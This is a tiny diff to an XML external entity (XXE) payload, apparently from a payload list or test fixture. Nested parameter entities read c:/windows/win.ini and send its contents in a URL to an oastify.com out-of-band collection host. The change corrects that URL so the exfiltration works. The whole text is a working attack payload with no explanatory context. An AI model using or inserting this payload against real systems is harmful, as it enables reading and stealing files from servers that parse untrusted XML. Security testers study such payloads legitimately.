@@ -1,4 +1,4 @@
 <!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
-<!ENTITY % bravo "<!ENTITY &#x25; charlie SYSTEM 'c2f55ckbjim9e1l1v2dgw5jcx33wrl.oastify.com/?%data;'>">
+<!ENTITY % bravo "<!ENTITY &#x25; charlie SYSTEM 'http://okccg3z8bao1jzmcbv9iq9tyup0fo4.oastify.com/?%data;'>">
 %bravo;
 %charlie;
